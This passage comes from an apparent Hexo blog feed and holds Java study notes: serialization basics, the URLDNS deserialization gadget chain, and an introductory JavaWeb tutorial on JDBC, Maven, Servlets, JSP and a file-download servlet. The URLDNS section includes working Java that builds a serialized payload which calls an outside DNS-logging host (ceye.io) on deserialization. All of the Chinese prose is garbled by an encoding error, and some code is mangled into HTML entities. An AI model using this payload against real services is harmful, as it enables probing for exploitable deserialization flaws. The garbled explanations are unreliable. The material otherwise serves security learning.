class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€äº›æ³¨æ„äº‹é¡¹</p><ul><li>åºåˆ—åŒ–é’ˆå¯¹çš„æ˜¯å¯¹è±¡è€Œä¸æ˜¯ç±»ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–æ—¶é™æ€æˆå‘˜æ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–çš„</li><li>å¦‚æœå­ç±»å®ç°äº†Serializableæ¥å£è€Œçˆ¶ç±»æ²¡æœ‰å®ç°ï¼Œé‚£ä¹ˆåœ¨åºåˆ—åŒ–æ—¶çˆ¶ç±»å®šä¹‰çš„å†…å®¹ä¸ä¼šè¢«åºåˆ—åŒ–</li><li>å¦‚æœç±»ä¸­æ·»åŠ äº†transientå…³é”®å­—ï¼Œé‚£ä¹ˆè¯¥å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Main.java</span><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"ser.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Person</span> p<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span>objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç±»ä¸­serialVersionUIDï¼Œå¦‚æœåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ç±»çš„serialVersionUIDä¸åŒä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸</li></ul><h3 id="ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–é“¾"><a href="#ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–é“¾" class="headerlink" title="ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–é“¾"></a>ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–é“¾</h3><p><strong>URLDNS</strong></p><ul><li><p>è¯¥é“¾ç”±ä¸¤ä¸ªç±»ç»„æˆï¼Œåˆ†åˆ«æ˜¯HashMapå’ŒURLStreamHandlerç±»</p></li><li><p>HashMapä¸­é‡è½½äº†readObjectå‡½æ•°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span><span class="token class-name">K</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">K</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>      <span class="token class-name">V</span> value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">V</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„è°ƒç”¨äº†hashå‡½æ•°ï¼Œé‚£ä¹ˆå¦‚æœå…¶ä¸­æœ‰å˜é‡é‡å†™äº†hashå‡½æ•°ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½æœ‰æ¼æ´</p></li><li><p>æˆ‘ä»¬å‘ç°URLStreamHandlerç±»ä¸­çš„hashCodeå‡½æ•°è°ƒç”¨äº†<code>getHostAddress</code>æ–¹æ³•ï¼Œæ­¤å¤„å¯¹ä¼ å…¥å‚æ•°uè¿›è¡Œäº†DNSæŸ¥è¯¢ï¼Œæ­¤æ—¶ååºåˆ—åŒ–é“¾å°±æ˜æ˜¾äº†</p></li><li><p>```<br>HashMap.readObject-&gt;URLStreamHandler.hashCode-&gt;getHostAddress</p><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;javapublic class Main &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        String url&#x3D;&quot;http:&#x2F;&#x2F;kcywg9.ceye.io&quot;;        URLStreamHandler handler&#x3D;new SilentURLStreamHandler();        HashMap ht&#x3D;new HashMap();        URL u&#x3D;new URL(null,url,handler);        ht.put(u,url);        ObjectOutputStream objectOutputStream&#x3D;new ObjectOutputStream(new FileOutputStream(&quot;ht.ser&quot;));        objectOutputStream.writeObject(ht);&#x2F;&#x2F;åºåˆ—åŒ–è¿‡ç¨‹        objectOutputStream.close();    &#125;    static class SilentURLStreamHandler extends URLStreamHandler&#123;        SilentURLStreamHandler()&#123;&#125;        protected URLConnection openConnection(URL u) throws IOException&#123;            return null;        &#125;        protected synchronized InetAddress getHostAddress(URL u)&#123;return null;&#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> -Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebå…¥é—¨</title>
      <link href="/posts/84f639f6.html"/>
      <url>/posts/84f639f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="JavaWeb"><a href="#JavaWeb" class="headerlink" title="JavaWeb"></a>JavaWeb</h1><h3 id="JDBC-API"><a href="#JDBC-API" class="headerlink" title="JDBC API"></a>JDBC API</h3><p>å¿«é€Ÿå…¥é—¨</p><ol><li>åˆ›å»ºå·¥ç¨‹å¯¼å…¥é©±åŠ¨jaråŒ…</li><li>æ³¨å†Œé©±åŠ¨<code>Class.forName(&quot;com.mysql.jdbc.Driver&quot;);</code></li><li>è·å–é“¾æ¥<code>Connection conn= DriverManager.getConnection(url,username,password);</code></li><li>å‡†å¤‡sqlè¯­å¥<code>String sql=&quot;update nnn set id=5 where id=4&quot;;</code></li><li>è·å–æ‰§è¡Œsqlå¯¹è±¡Statement<code>Statement stmt=conn.createStatement();</code></li><li>æ‰§è¡Œsqlå¹¶è·å–è¿”å›å†…å®¹<code>int count=stmt.executeUpdate(sql);</code></li><li>å…³é—­é“¾æ¥<code>stmt.close();conn.close();</code></li></ol><h3 id="APIè¯¦è§£"><a href="#APIè¯¦è§£" class="headerlink" title="APIè¯¦è§£"></a>APIè¯¦è§£</h3><h5 id="DriverManager"><a href="#DriverManager" class="headerlink" title="DriverManager"></a>DriverManager</h5><ul><li>é©±åŠ¨ç®¡ç†ç±»çš„ä½œç”¨<ul><li>æ³¨å†Œé©±åŠ¨</li><li>è·å–æ•°æ®åº“çš„è¿æ¥</li></ul></li><li>ä¸€äº›æ–¹æ³•ï¼ˆéƒ½æ˜¯é™æ€æ–¹æ³•ï¼‰<ul><li><code>getConnection()</code>å°è¯•å»ºç«‹ä¸ç»™å®šæ•°æ®åº“URLçš„è¿æ¥<ul><li>urlï¼šjdbc:æ•°æ®åº“ç±»å‹://IP:ç«¯å£/æ•°æ®åº“åç§°?å‚æ•°</li></ul></li><li><code>registerDriver()</code>æ³¨å†Œç»™å®šçš„é©±åŠ¨ç¨‹åºï¼Œä¸Šé¢mysqlä¸­çš„Driverç±»æœ¬è´¨åˆ©ç”¨çš„è¿˜æ˜¯è¿™ä¸ªå‡½æ•°</li></ul></li></ul><h5 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h5><ul><li><p>æ•°æ®åº“è¿æ¥å¯¹è±¡çš„ä½œç”¨</p><ul><li>è·å–æ‰§è¡ŒSQLçš„å¯¹è±¡</li><li>ç®¡ç†äº‹åŠ¡</li></ul></li><li><p>ä¸€äº›æ–¹æ³•</p><ul><li><p><code>Statement createStatement()</code>æ™®é€šæ‰§è¡ŒSQLå¯¹è±¡</p></li><li><p><code>PreparedStatement preparedStatement(sql)</code>é¢„ç¼–è¯‘SQLçš„æ‰§è¡ŒSQLå¯¹è±¡ï¼Œé˜²SQLæ³¨å…¥</p><ul><li>é¦–å…ˆè·å–ä¸€ä¸ªPreparedStatementå¯¹è±¡ï¼Œç„¶åSQLè¯­å¥ä¸­çš„å‚æ•°å€¼ç”¨?ä»£æ›¿å ä½</li><li>è¿›è¡Œ<code>setxxx(å‚æ•°1,å‚æ•°2)</code>æ¥ç»™?èµ‹å€¼</li><li>ç›´æ¥æ‰§è¡Œæ— éœ€å†æ¬¡ç©¿å‚</li></ul></li><li><p>MySQLäº‹åŠ¡ç®¡ç†</p></li><li><p><code>setAutoCommit(boolen)</code>trueä¸ºè‡ªåŠ¨æäº¤äº‹åŠ¡ï¼Œfalseä¸ºæ‰‹åŠ¨æäº¤äº‹åŠ¡ï¼Œå³ä¸ºå¼€å¯äº‹åŠ¡</p></li><li><p><code>commit()</code>æäº¤äº‹åŠ¡</p></li><li><p><code>rollback()</code>å›æ»šäº‹åŠ¡</p></li></ul></li></ul><h5 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h5><ul><li>ä½œç”¨ï¼šæ‰§è¡ŒSQLè¯­å¥</li><li><code>int executeUpdate(sql)</code>æ‰§è¡ŒDMLï¼ŒDDLè¯­å¥ï¼Œè¿”å›DMLè¯­å¥å½±å“çš„è¡Œæ•°ï¼ŒDDLè¯­å¥æ‰§è¡Œåï¼Œæ‰§è¡ŒæˆåŠŸä¹Ÿå¯èƒ½è¿”å›0</li><li><code>ResultSet executeQuery(sql)</code>æ‰§è¡ŒDQLè¯­å¥ï¼Œè¿”å›ç»“æœé›†å¯¹è±¡</li><li>ResultSet<ul><li><code>next()</code>å…‰æ ‡å‘åç§»ä¸€ä½å¹¶åˆ¤æ–­æ˜¯å¦æœ‰å†…å®¹</li><li><code>getsæ•°æ®ç±»å‹(åˆ—åæˆ–åˆ—æ•°)</code>è·å–å½“å‰å…‰æ ‡æŒ‡å‘çš„å†…å®¹</li></ul></li></ul><h5 id="æ•°æ®åº“è¿æ¥æ± "><a href="#æ•°æ®åº“è¿æ¥æ± " class="headerlink" title="æ•°æ®åº“è¿æ¥æ± "></a>æ•°æ®åº“è¿æ¥æ± </h5><ul><li><p>ä¸ºäº†ä¿æŒæ•°æ®åº“è¿æ¥å­˜åœ¨</p></li><li><p>ä½¿ç”¨è¿‡ç¨‹</p><ol><li><p>å¯¼å…¥jaråŒ…</p></li><li><p>å®šä¹‰é…ç½®æ–‡ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">driverClassName&#x3D;com.mysql.jc.jdbc.Driverurl&#x3D;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;db1?characterEncoding&#x3D;utf-8username&#x3D;rootpassword&#x3D;123456initialSize&#x3D;5maxActive&#x3D;10maxWait&#x3D;5000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>å¯¼å…¥é…ç½®æ–‡ä»¶<code>Properties prop=new Properties();</code></p><p><code>prop.load(new FileInputStream(&quot;/Users/jlan/IdeaProjects/JavaWeb/jdbc-demo/src/druid.properties&quot;));</code></p></li><li><p>å»ºç«‹è¿æ¥<code>DataSource dataSource= DruidDataSourceFactory.createDataSource(prop);</code><br><code>Connection connection=dataSource.getConnection();</code></p></li></ol></li></ul><h5 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h5><ul><li><p>Mavenæ˜¯ä¸“é—¨ç”¨äºç®¡ç†å’Œæ„å»ºJavaé¡¹ç›®çš„æ”»å‡»ï¼Œå®ƒçš„ä¸»è¦åŠŸèƒ½æœ‰</p><ul><li><p>æä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–çš„é¡¹ç›®ç»“æ„</p><ul><li>maven-projectâ€”â€”é¡¹ç›®åç§°<ul><li>srcâ€”â€”æºä»£ç å’Œæµ‹è¯•ä»£ç ç›®å½•<ul><li>mainâ€”â€”æºä»£ç ç›®å½•<ul><li>javaâ€”â€”æºä»£ç Javaæ–‡ä»¶ç›®å½•</li><li>resourcesâ€”â€”æºä»£ç é…ç½®æ–‡ä»¶ç›®å½•</li><li>webappâ€”â€”webé¡¹ç›®æ ¸å¿ƒç›®å½•</li></ul></li><li>testâ€”â€”æµ‹è¯•ä»£ç ç›®å½•<ul><li>javaâ€”â€”æµ‹è¯•ä»£ç Javaæ–‡ä»¶ç›®å½•</li><li>resourcesâ€”â€”æµ‹è¯•ä»£ç é…ç½®æ–‡ä»¶ç›®å½•</li></ul></li><li>pom.xmlâ€”â€”é¡¹ç›®æ ¸å¿ƒé…ç½®æ–‡ä»¶</li></ul></li></ul></li></ul></li><li><p>æä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–çš„æ„å»ºæµç¨‹</p><ul><li>æ­£å¸¸æ„å»ºæµç¨‹<ul><li>ç¼–è¯‘ï¼Œæµ‹è¯•ï¼Œæ‰“åŒ…ï¼Œå‘å¸ƒ</li></ul></li><li>Mavenæä¾›ä¸€å¥—å‘½ä»¤æ¥ç®€å•æ„å»º</li></ul></li><li><p>æä¾›äº†ä¸€å¥—ä¾èµ–ç®¡ç†æœºåˆ¶</p><ul><li><p>æ­£å¸¸å¯¼å…¥åŒ…æµç¨‹</p><ul><li>ä¸‹è½½jaråŒ…</li><li>å¤åˆ¶jaråŒ…åˆ°é¡¹ç›®</li><li>å¯¼å…¥jaråŒ…</li></ul></li><li><p>Mavenå¯¼å…¥åŒ…</p><ul><li><p>æ›´æ”¹pom.xmlé…ç½®æ–‡ä»¶å³å¯ </p><pre class="line-numbers language-none"><code class="language-none">        <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul></li></ul></li><li><p>ä½¿ç”¨Mavenæ„å»ºçš„é¡¹ç›®ç»“æ„å®Œå…¨ä¸€æ ·ï¼Œæ‰€æœ‰IDEåˆ›å»ºçš„Mavené¡¹ç›®å¯ä»¥é€šç”¨</p></li><li><p>Mavençš„ä»“åº“</p><ul><li>æœ¬åœ°ä»“åº“ï¼šæœ¬åœ°è®¡ç®—æœºä¸Šçš„ä¸€ä¸ªç›®å½•</li><li>ä¸­å¤®ä»“åº“ï¼šç”±Mavenå›¢é˜Ÿç»´æŠ¤çš„å…¨çƒå”¯ä¸€çš„ä»“åº“</li><li>è¿œç¨‹ä»“åº“ï¼šä¸€èˆ¬æ˜¯ç”±å…¬å¸æ­å»ºçš„ç§æœ‰ä»“åº“</li></ul></li></ul><h5 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h5><ul><li>æ˜¯ä¸€æ¬¾æŒä¹…å±‚ï¼ˆè´Ÿè´£å°†æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“çš„é‚£ä¸€å±‚ä»£ç ï¼‰æ¡†æ¶ï¼Œç”¨äºç®€åŒ–JDBCå¼€å‘</li><li>JDBCçš„ç¼ºç‚¹ï¼šç¡¬ç¼–ç ï¼Œæ“ä½œç¹ç</li><li>MyBatisé€šè¿‡é…ç½®æ–‡ä»¶è§£å†³äº†ç¡¬ç¼–ç å’Œæ“ä½œç¹ççš„é—®é¢˜ï¼Œé€šè¿‡é¢„å…ˆå®šä¹‰çš„é…ç½®æ–‡ä»¶æ¥ç®€åŒ–è¿æ¥åŠå¤„ç†ç»“æœé›†çš„å·¥ä½œ</li></ul><h5 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h5><ul><li><p>ç¬¬ä¸€ä¸ªç¤ºä¾‹ç¨‹åº</p></li><li><p>```java<br>//MyFirstServlet.java<br>package top.darkflow;<br>import javax.servlet.*;<br>import java.io.IOException;<br>import java.io.PrintWriter;<br>public class MyFirstServlet implements Servlet {</p><pre><code>public void init(ServletConfig config) throws ServletException &#123;    System.out.println(&quot;Init&quot;);&#125;public void service(ServletRequest request, ServletResponse response)        throws ServletException, IOException &#123;    System.out.println(&quot;From service&quot;);    PrintWriter out = response.getWriter();    out.println(&quot;Hello, Java Web.&quot;);&#125;public void destroy() &#123;    System.out.println(&quot;Destroy&quot;);&#125;public String getServletInfo() &#123;    return null;&#125;public ServletConfig getServletConfig() &#123;    return null;&#125;</code></pre><p>}</p><pre class="line-numbers language-none"><code class="language-none">- &#96;&#96;&#96;xml  &lt;!--web.xml--&gt;  &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  &lt;web-app version&#x3D;&quot;2.4&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&quot;           xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;           xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee  http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&#x2F;web-app_2_4.xsd&quot;&gt;      &lt;servlet&gt;          &lt;servlet-name&gt;MyFirstServletName&lt;&#x2F;servlet-name&gt;          &lt;servlet-class&gt;com.skyline.MyFirstServlet&lt;&#x2F;servlet-class&gt;      &lt;&#x2F;servlet&gt;      &lt;servlet-mapping&gt;          &lt;servlet-name&gt;MyFirstServletName&lt;&#x2F;servlet-name&gt;          &lt;url-pattern&gt;&#x2F;hello&lt;&#x2F;url-pattern&gt;      &lt;&#x2F;servlet-mapping&gt;  &lt;&#x2F;web-app&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Web.xmlæ–‡ä»¶çš„ä½œç”¨æ˜¯å‘Šè¯‰tomcatæˆ‘ä»¬æƒ³è¦ä½¿ç”¨å“ªä¸€ä¸ªservletæ¥å¤„ç†å¯¹åº”çš„è¯·æ±‚ï¼Œtomcaté€šè¿‡è¯¥æ–‡ä»¶æ¥æ‰¾åˆ°å¯¹åº”çš„servletæ¥å®Œæˆè¯·æ±‚åŠå“åº”çš„è¿‡ç¨‹</p></li><li><p>å°†ç”Ÿæˆçš„classæ–‡ä»¶ä»¥åŠweb.xmlæ–‡ä»¶æŒ‰ç…§ä¸‹é¢çš„ç›®å½•ç»“æ„æ”¾å…¥webappsæ–‡ä»¶å¤¹ä¸‹</p></li><li><p>```<br>webapps</p><ul><li>MyFirstServlet<ul><li>WEB-INF<ul><li>classes<ul><li>top<ul><li>darkflow<ul><li>MyFirstServlet.class</li></ul></li></ul></li></ul></li><li>web.xml<pre class="line-numbers language-none"><code class="language-none">- é‡å¯tomcatæœåŠ¡å¹¶è®¿é—®&#x2F;MyFirstServlet&#x2F;helloå°±èƒ½çœ‹åˆ°å†…å®¹å•¦##### JSP- ä»ä¸Šé¢çš„ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œç›´æ¥ä½¿ç”¨servletç”Ÿæˆç½‘é¡µï¼Œä¸ä»…ä»£ç å†™èµ·æ¥éº»çƒ¦ï¼Œå¯ç»´æŠ¤æ€§ä¹Ÿä¸é«˜ï¼Œä¸ºäº†æŠŠHTMLä¸­çš„è¿™äº›éé€»è¾‘çš„éƒ¨åˆ†æŠ½ç¦»å‡ºï¼Œæˆ‘ä»¬å¼•å…¥äº†JSPæŠ€æœ¯- JSPå…¨ç§°ä¸ºJavaServer Pagesï¼Œå¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§é«˜åº¦æŠ½è±¡çš„servletï¼Œåœ¨JSPè¿è¡ŒæœŸé—´å®é™…ä¸Šä¼šè¢«ç¼–è¯‘ä¸ºservlet- ä½¿ç”¨jspæˆ‘ä»¬åªéœ€è¦åœ¨WEB-INFæ—åˆ›å»ºä¸€ä¸ªjspæ–‡ä»¶å¹¶å†™å…¥ä»£ç å³å¯- &#96;&#96;&#96;jsp  &lt;!--test.jsp--&gt;  &lt;%@ page import&#x3D;&quot;java.time.LocalDateTime&quot; %&gt;  &lt;html&gt;  &lt;body&gt;  &lt;h2&gt;  &lt;%  out.write(LocalDateTime.now().toString());  %&gt;  &lt;&#x2F;h2&gt;  &lt;&#x2F;body&gt;  &lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul></li></ul></li><li><p>æ­¤æ—¶æˆ‘ä»¬è®¿é—®/MyFirstServlet/test.jspå³å¯</p></li><li><p>ä¸€äº›è¯­æ³•</p><ul><li><code>&lt;% ä»£ç ç‰‡æ®µ %&gt;</code>ç­‰ä»·äº<code>&lt;jsp:scriptlet&gt; ä»£ç ç‰‡æ®µ &lt;/jsp:scriptlet&gt;</code></li><li><code>&lt;%! ä¸€äº›å˜é‡å£°æ˜ %&gt;</code>ç­‰ä»·äº<code>&lt;jsp:declaration&gt; ä»£ç ç‰‡æ®µ &lt;/jsp:declaration&gt;</code></li></ul></li></ul><h2 id="Servlet-1"><a href="#Servlet-1" class="headerlink" title="Servlet"></a>Servlet</h2><p>é…ç½®æ–‡ä»¶web.xmlçš„ä¸€ä¸ªç¤ºä¾‹ï¼Œé€šè¿‡é…ç½®æ–‡ä»¶æ¥è§£æURL</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">web-app</span> <span class="token name">PUBLIC</span>        <span class="token string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span>        <span class="token string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>downloadfile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>top.darkflow.Fileget<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>downloadfile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/down<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ–‡ä»¶ä¸‹è½½</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Fileget</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"/Users/jlan/IdeaProjects/javaweb-02-servlet/response/src/main/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ä¸‹è½½æ–‡ä»¶è·¯å¾„ä¸ºï¼š"</span><span class="token operator">+</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> fileName<span class="token operator">=</span>path<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token char">'/'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resp<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">,</span><span class="token string">"attachment:filename="</span><span class="token operator">+</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">FileInputStream</span> in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">ServletOutputStream</span> out<span class="token operator">=</span>resp<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>len<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            out<span class="token punctuation">.</span><span class="token function">write</span><span class="token 